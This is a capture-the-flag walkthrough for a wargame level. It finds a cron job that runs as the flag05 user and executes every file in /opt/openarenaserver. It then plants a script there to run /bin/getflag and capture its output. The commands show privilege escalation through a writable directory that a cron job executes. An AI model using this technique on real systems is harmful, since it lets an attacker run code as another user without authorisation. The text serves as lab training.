The command ```find / -group level05 2>/dev/null``` lists nothing of interest but the command :
```find / -group flag05 2>/dev/null``` get this results :
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver

=> execute /usr/sbin/openarenaserver as flag05 ?

The command ```find / -name "level05" 2>/dev/null``` get these files :
/var/mail/level05
/rofs/var/mail/level05

```cat /var/mail/level05```
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

***this looks like a crontab syntax to execute the command every 2 minutes***
we can assume this crontab is in use for flag05 user


```cat /usr/sbin/openarenaserver```
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done

This script execute any file in /opt/openarenaserver then delete it

we create a file in this directory that executes getflag ```echo "/bin/getflag > /tmp/flag" > /opt/openarenaserver/getflag```
we add permission to be executed : ```chmod +x /opt/openarenaserver/getflag```
after waiting 2 minutes the file /tmp/flag contains our flag : ```cat /tmp/flag```

This method can be refined with the command ```echo "/bin/getflag | wall``` as now all users get the getflag message :
echo "/bin/getflag | wall" > getflag && chmod +x getflag 